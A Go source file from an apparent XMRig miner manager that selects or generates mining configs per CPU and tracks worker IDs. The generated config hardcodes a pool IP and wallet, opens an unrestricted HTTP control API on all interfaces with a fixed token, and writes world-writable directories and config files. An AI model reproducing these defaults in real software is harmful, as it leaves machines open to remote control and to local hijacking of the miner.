package xmrig

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"tarish/cpu"
	"tarish/embedded"
)

// Config represents the xmrig configuration structure (partial)
type Config struct {
	Autosave    bool        `json:"autosave,omitempty"`
	CPU         interface{} `json:"cpu,omitempty"`
	DonateLevel int         `json:"donate-level,omitempty"`
	Pools       []Pool      `json:"pools,omitempty"`
	HTTP        *HTTPConfig `json:"http,omitempty"`
	// Store all other fields
	Raw map[string]interface{} `json:"-"`
}

// Pool represents a mining pool configuration
type Pool struct {
	URL       string `json:"url"`
	User      string `json:"user"`
	Pass      string `json:"pass,omitempty"`
	Keepalive bool   `json:"keepalive,omitempty"`
	TLS       bool   `json:"tls,omitempty"`
}

// HTTPConfig represents xmrig's HTTP API configuration
type HTTPConfig struct {
	Enabled     bool   `json:"enabled"`
	Host        string `json:"host"`
	Port        int    `json:"port"`
	AccessToken string `json:"access-token,omitempty"`
	Restricted  bool   `json:"restricted"`
}

// SelectConfig finds the most appropriate config file for the detected CPU.
// If no static config file matches, it generates a generic config based on core count.
func SelectConfig(cpuInfo *cpu.Info, configsPath string) (string, error) {
	// List of config file candidates in priority order
	candidates := buildConfigCandidates(cpuInfo)

	for _, candidate := range candidates {
		configPath := filepath.Join(configsPath, candidate)
		if _, err := os.Stat(configPath); err == nil {
			return configPath, nil
		}
	}

	// No static config found — generate a generic one based on core count
	fmt.Printf("  No static config found, generating generic config for %d cores...\n", cpuInfo.Cores)
	genericPath, err := generateGenericConfig(cpuInfo, configsPath)
	if err != nil {
		return "", fmt.Errorf("no suitable config found for CPU: %s (family: %s): %w", cpuInfo.RawModel, cpuInfo.Family, err)
	}
	return genericPath, nil
}

// buildConfigCandidates returns a prioritized list of config filenames to try
func buildConfigCandidates(cpuInfo *cpu.Info) []string {
	var candidates []string

	// 1. Exact family match (e.g., apple_m3_pro.json)
	candidates = append(candidates, cpuInfo.Family+".json")

	// 2. Short form match for Apple chips (e.g., m3pro.json, m1.json)
	shortName := getShortName(cpuInfo.Family)
	if shortName != "" {
		candidates = append(candidates, shortName+".json")
	}

	// 3. Base family match (e.g., apple_m3.json for apple_m3_pro)
	baseFamily := getBaseFamily(cpuInfo.Family)
	if baseFamily != cpuInfo.Family {
		candidates = append(candidates, baseFamily+".json")
		// Also try short form of base family (e.g., m3.json)
		baseShort := getShortName(baseFamily)
		if baseShort != "" {
			candidates = append(candidates, baseShort+".json")
		}
	}

	// 4. Vendor match (e.g., apple.json, intel.json, amd.json)
	vendor := getVendor(cpuInfo.Family)
	if vendor != "" && vendor != cpuInfo.Family && vendor != baseFamily {
		candidates = append(candidates, vendor+".json")
	}

	// 5. Architecture-specific default (e.g., arm64_default.json)
	candidates = append(candidates, cpuInfo.Arch+"_default.json")

	// 6. OS-specific default (e.g., darwin_default.json)
	candidates = append(candidates, cpuInfo.OS+"_default.json")

	// 7. Generic fallback
	candidates = append(candidates, "default.json")

	return candidates
}

// generateGenericConfig creates a config file dynamically based on CPU core count
// and vendor information. It writes the config to configsPath/generic_NNcores.json
// and returns the path.
func generateGenericConfig(cpuInfo *cpu.Info, configsPath string) (string, error) {
	cores := cpuInfo.Cores
	if cores < 1 {
		cores = 1
	}

	// Build thread index array [0, 1, ..., cores-1]
	threads := make([]int, cores)
	for i := 0; i < cores; i++ {
		threads[i] = i
	}

	// Determine ASM optimization based on vendor
	asmMode := "auto"
	vendor := getVendor(cpuInfo.Family)
	if vendor == "amd" || strings.Contains(strings.ToLower(cpuInfo.RawModel), "amd") {
		asmMode = "ryzen"
	} else if vendor == "intel" || strings.Contains(strings.ToLower(cpuInfo.RawModel), "intel") {
		asmMode = "intel"
	}

	// Scale settings based on core count
	hugePages := true
	hugePagesJit := cores >= 8
	memoryPool := cores >= 8
	oneGbPages := cores >= 16
	priority := 5

	// For low-core machines, reduce priority to avoid starving the system
	if cores <= 2 {
		priority = 3
	} else if cores <= 4 {
		priority = 4
	}

	// Build the config structure
	config := map[string]interface{}{
		"api": map[string]interface{}{
			"id":        nil,
			"worker-id": nil,
		},
		"http": map[string]interface{}{
			"enabled":      true,
			"host":         "0.0.0.0",
			"port":         8181,
			"access-token": "Hello2025@",
			"restricted":   false,
		},
		"autosave":   false,
		"background": false,
		"colors":     true,
		"title":      true,
		"randomx": map[string]interface{}{
			"init":                     -1,
			"init-avx2":                -1,
			"mode":                     "fast",
			"1gb-pages":                oneGbPages,
			"rdmsr":                    true,
			"wrmsr":                    cores >= 8,
			"cache_qos":                false,
			"numa":                     true,
			"scratchpad_prefetch_mode": 1,
		},
		"cpu": map[string]interface{}{
			"enabled":          true,
			"huge-pages":       hugePages,
			"huge-pages-jit":   hugePagesJit,
			"hw-aes":           nil,
			"priority":         priority,
			"memory-pool":      memoryPool,
			"yield":            false,
			"max-threads-hint": 100,
			"asm":              asmMode,
			"argon2-impl":      nil,
			"rx":               threads,
		},
		"opencl": map[string]interface{}{
			"enabled":   false,
			"cache":     true,
			"loader":    nil,
			"cn-lite/0": false,
			"cn/0":      false,
		},
		"cuda": map[string]interface{}{
			"enabled":   false,
			"loader":    nil,
			"cn-lite/0": false,
			"cn/0":      false,
		},
		"log-file":          "/usr/local/share/tarish/log/xmrig.log",
		"donate-level":      0,
		"donate-over-proxy": 0,
		"pools": []map[string]interface{}{
			{
				"algo":             "RandomX",
				"coin":             nil,
				"url":              "150.230.194.138:3333",
				"user":             "12EdCKM7ZWXGTMk3oVbS1XEuErrDfZdmmdGw5LTXBnecnwqavxPoZoE6vCjQ7oYnfURxG1bUUo2au5d6j2Trz8U4r2H",
				"pass":             "x",
				"rig-id":           nil,
				"nicehash":         false,
				"keepalive":        true,
				"enabled":          true,
				"tls":              false,
				"sni":              false,
				"tls-fingerprint":  nil,
				"daemon":           false,
				"socks5":           nil,
				"self-select":      nil,
				"submit-to-origin": false,
			},
		},
		"retries":     5,
		"retry-pause": 5,
		"print-time":  60,
		"syslog":      false,
		"tls": map[string]interface{}{
			"enabled":      false,
			"protocols":    nil,
			"cert":         nil,
			"cert_key":     nil,
			"ciphers":      nil,
			"ciphersuites": nil,
			"dhparam":      nil,
		},
		"dns": map[string]interface{}{
			"ipv6": false,
			"ttl":  30,
		},
		"user-agent":       nil,
		"verbose":          0,
		"watch":            true,
		"pause-on-battery": false,
		"pause-on-active":  false,
	}

	// Write the generic config file
	configName := fmt.Sprintf("generic_%dcores.json", cores)
	configPath := filepath.Join(configsPath, configName)

	output, err := json.MarshalIndent(config, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to generate generic config: %w", err)
	}
	output = append(output, '\n')

	// Ensure configs directory exists
	if err := os.MkdirAll(configsPath, 0755); err != nil {
		return "", fmt.Errorf("failed to create configs directory: %w", err)
	}

	if err := os.WriteFile(configPath, output, 0644); err != nil {
		return "", fmt.Errorf("failed to write generic config: %w", err)
	}

	return configPath, nil
}

// getShortName converts family to short config name (e.g., apple_m3_pro -> m3pro)
func getShortName(family string) string {
	// Handle Apple Silicon short names
	if strings.HasPrefix(family, "apple_m") {
		// Remove "apple_" prefix
		name := strings.TrimPrefix(family, "apple_")
		// Remove underscores (m3_pro -> m3pro)
		name = strings.ReplaceAll(name, "_", "")
		return name
	}

	// Handle AMD Ryzen (e.g., amd_ryzen9 -> ryzen9)
	if strings.HasPrefix(family, "amd_") {
		return strings.TrimPrefix(family, "amd_")
	}

	// Handle Intel (e.g., intel_i9 -> i9)
	if strings.HasPrefix(family, "intel_") {
		return strings.TrimPrefix(family, "intel_")
	}

	return ""
}

// getBaseFamily extracts the base family (e.g., "apple_m3" from "apple_m3_pro")
func getBaseFamily(family string) string {
	// Map variant suffixes to their base
	variants := []string{"_ultra", "_max", "_pro"}
	for _, suffix := range variants {
		if strings.HasSuffix(family, suffix) {
			return strings.TrimSuffix(family, suffix)
		}
	}

	// Handle intel/amd specific variants
	if strings.HasPrefix(family, "intel_i") || strings.HasPrefix(family, "amd_ryzen") {
		return getVendor(family)
	}

	return family
}

// getVendor extracts the vendor from family (e.g., "apple" from "apple_m3_pro")
func getVendor(family string) string {
	if strings.HasPrefix(family, "apple") {
		return "apple"
	}
	if strings.HasPrefix(family, "intel") {
		return "intel"
	}
	if strings.HasPrefix(family, "amd") {
		return "amd"
	}
	return ""
}

// GetInstalledConfigPath returns the path to installed configs directory
func GetInstalledConfigPath() string {
	// 1. Check user-local path (~/.local/share/tarish/configs)
	home, _ := os.UserHomeDir()
	if home != "" {
		userPath := filepath.Join(home, ".local", "share", "tarish", "configs")
		if _, err := os.Stat(userPath); err == nil {
			return userPath
		}
	}

	// 2. Check standard system installation path
	installPath := "/usr/local/share/tarish/configs"
	if _, err := os.Stat(installPath); err == nil {
		return installPath
	}

	// Fallback to relative path (for development)
	execPath, err := os.Executable()
	if err == nil {
		execDir := filepath.Dir(execPath)
		devPath := filepath.Join(execDir, "configs")
		if _, err := os.Stat(devPath); err == nil {
			return devPath
		}
	}

	// Try current working directory
	cwd, _ := os.Getwd()
	cwdPath := filepath.Join(cwd, "configs")
	if _, err := os.Stat(cwdPath); err == nil {
		return cwdPath
	}

	// Fallback: extract from embedded assets on-demand
	fmt.Println("  Extracting configs from embedded assets...")
	if err := embedded.ExtractConfigs(""); err == nil {
		return embedded.GetSharePath()
	}

	return installPath // Return default even if not found
}

// LoadConfig loads and parses an xmrig config file
func LoadConfig(configPath string) (*Config, error) {
	data, err := os.ReadFile(configPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read config: %w", err)
	}

	// Parse into raw map first to preserve all fields
	var raw map[string]interface{}
	if err := json.Unmarshal(data, &raw); err != nil {
		return nil, fmt.Errorf("failed to parse config: %w", err)
	}

	// Parse into struct
	var config Config
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, fmt.Errorf("failed to parse config: %w", err)
	}

	config.Raw = raw
	return &config, nil
}

// GetConfigForCurrentSystem detects CPU and returns the appropriate config path
func GetConfigForCurrentSystem() (string, *cpu.Info, error) {
	cpuInfo, err := cpu.Detect()
	if err != nil {
		return "", nil, fmt.Errorf("failed to detect CPU: %w", err)
	}

	configsPath := GetInstalledConfigPath()
	configPath, err := SelectConfig(cpuInfo, configsPath)
	if err != nil {
		return "", cpuInfo, err
	}

	return configPath, cpuInfo, nil
}

// ListAvailableConfigs returns all config files in the configs directory
func ListAvailableConfigs() ([]string, error) {
	configsPath := GetInstalledConfigPath()
	entries, err := os.ReadDir(configsPath)
	if err != nil {
		// Fallback to embedded configs list
		return embedded.ListEmbeddedConfigs()
	}

	var configs []string
	for _, entry := range entries {
		if !entry.IsDir() && strings.HasSuffix(entry.Name(), ".json") {
			configs = append(configs, entry.Name())
		}
	}

	return configs, nil
}

// GetDataDir returns the tarish data directory path
func GetDataDir() string {
	home, err := os.UserHomeDir()
	if err != nil {
		home = "/tmp"
	}
	return filepath.Join(home, ".tarish")
}

// EnsureDataDir creates the data directory if it doesn't exist
func EnsureDataDir() error {
	dataDir := GetDataDir()
	return os.MkdirAll(dataDir, 0755)
}

// GetPIDFile returns the path to the PID file
func GetPIDFile() string {
	// Store PID file in the log directory which is world-writable
	return filepath.Join(GetLogDir(), "xmrig.pid")
}

// GetLogDir returns the log directory path
func GetLogDir() string {
	// Base it on where configs are installed
	configPath := GetInstalledConfigPath()
	// configPath is .../tarish/configs, so dir is .../tarish
	baseDir := filepath.Dir(configPath)
	return filepath.Join(baseDir, "log")
}

// GetLogFile returns the path to the log file
func GetLogFile() string {
	return filepath.Join(GetLogDir(), "xmrig.log")
}

// EnsureLogDir creates the log directory if it doesn't exist
func EnsureLogDir() error {
	// Try to create with 777 permissions
	// Note: umask might still restrict this, but we try our best
	if err := os.MkdirAll(GetLogDir(), 0777); err != nil {
		return err
	}
	// Force permissions if we own the directory or have rights
	os.Chmod(GetLogDir(), 0777)
	return nil
}

// GetBinPath returns the binary search path based on OS
func GetBinPath() string {
	// Check installed location first
	installPath := "/usr/local/share/tarish/bin"
	if _, err := os.Stat(installPath); err == nil {
		return installPath
	}

	// Check relative to executable
	execPath, err := os.Executable()
	if err == nil {
		binPath := filepath.Join(filepath.Dir(execPath), "bin")
		if _, err := os.Stat(binPath); err == nil {
			return binPath
		}
	}

	// Check current directory
	cwd, _ := os.Getwd()
	cwdBin := filepath.Join(cwd, "bin")
	if _, err := os.Stat(cwdBin); err == nil {
		return cwdBin
	}

	return installPath
}

// GetPlatformName returns the platform identifier used in binary names
func GetPlatformName() string {
	osName := runtime.GOOS
	if osName == "darwin" {
		osName = "macos"
	}
	return fmt.Sprintf("%s_%s", osName, runtime.GOARCH)
}

// GetRuntimeConfigPath returns the path to the runtime config file
func GetRuntimeConfigPath() string {
	return filepath.Join(GetLogDir(), "xmrig_runtime.json")
}

// PrepareRuntimeConfig creates a runtime config with api.id and worker-id populated.
// It reads the selected config, injects identity fields, and writes to a runtime path.
func PrepareRuntimeConfig(configPath string, cpuInfo *cpu.Info) (string, error) {
	data, err := os.ReadFile(configPath)
	if err != nil {
		return "", fmt.Errorf("failed to read config: %w", err)
	}

	var raw map[string]interface{}
	if err := json.Unmarshal(data, &raw); err != nil {
		return "", fmt.Errorf("failed to parse config: %w", err)
	}

	// Build api.id: short CPU name + index (e.g. "m3max-0", "5900x-0")
	shortName := getShortCPUName(cpuInfo.Family)
	apiID := shortName + "-0"

	// Build worker-id: local IP with dots replaced by dashes (e.g. "192-168-1-50")
	workerID := buildWorkerID()

	// Inject into the api section
	apiSection, ok := raw["api"].(map[string]interface{})
	if !ok {
		apiSection = make(map[string]interface{})
	}
	apiSection["id"] = apiID
	apiSection["worker-id"] = workerID
	raw["api"] = apiSection

	// Write runtime config
	runtimePath := GetRuntimeConfigPath()
	output, err := json.MarshalIndent(raw, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal config: %w", err)
	}
	output = append(output, '\n')

	if err := os.WriteFile(runtimePath, output, 0666); err != nil {
		return "", fmt.Errorf("failed to write runtime config: %w", err)
	}
	os.Chmod(runtimePath, 0666)

	return runtimePath, nil
}

// getShortCPUName returns a concise identifier for the CPU family.
// Apple Silicon: apple_m3_max → m3max, AMD specific: 5900x → 5900x
func getShortCPUName(family string) string {
	if short := getShortName(family); short != "" {
		return short
	}
	return family
}

// buildWorkerID returns the local IP address with dots replaced by dashes.
func buildWorkerID() string {
	ip := getLocalIP()
	return strings.ReplaceAll(ip, ".", "-")
}

// getLocalIP returns the machine's preferred outbound IPv4 address.
func getLocalIP() string {
	// Preferred: determine the outbound IP via a UDP dial (no data is sent)
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err == nil {
		defer conn.Close()
		if addr, ok := conn.LocalAddr().(*net.UDPAddr); ok {
			return addr.IP.String()
		}
	}

	// Fallback: enumerate network interfaces
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() {
			if ipNet.IP.To4() != nil {
				return ipNet.IP.String()
			}
		}
	}
	return "unknown"
}

// GetHTTPConfigFromRuntime reads port and access-token from the active config.
// It checks the runtime config first, then falls back to the system-selected config.
func GetHTTPConfigFromRuntime() (port int, accessToken string) {
	port = 8181 // match config default
	accessToken = ""

	// Try runtime config first, then fall back to system-selected config
	data, err := os.ReadFile(GetRuntimeConfigPath())
	if err != nil {
		// Miner may have been started before runtime config was introduced,
		// or manually — fall back to the config that matches this system.
		if configPath, _, cfgErr := GetConfigForCurrentSystem(); cfgErr == nil {
			data, err = os.ReadFile(configPath)
		}
		if err != nil {
			return
		}
	}

	var raw map[string]interface{}
	if err := json.Unmarshal(data, &raw); err != nil {
		return
	}

	if httpSection, ok := raw["http"].(map[string]interface{}); ok {
		if p, ok := httpSection["port"].(float64); ok {
			port = int(p)
		}
		if t, ok := httpSection["access-token"].(string); ok {
			accessToken = t
		}
	}
	return
}
